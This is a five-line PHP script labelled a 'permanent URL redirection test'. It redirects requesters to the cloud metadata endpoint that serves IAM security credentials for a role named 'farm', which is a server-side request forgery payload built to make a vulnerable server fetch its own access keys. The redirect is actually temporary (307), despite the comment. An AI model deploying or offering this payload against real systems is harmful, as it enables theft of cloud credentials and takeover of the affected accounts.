<?php
// PHP permanent URL redirection test
header("Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/farm", true, 307);
exit();
?>
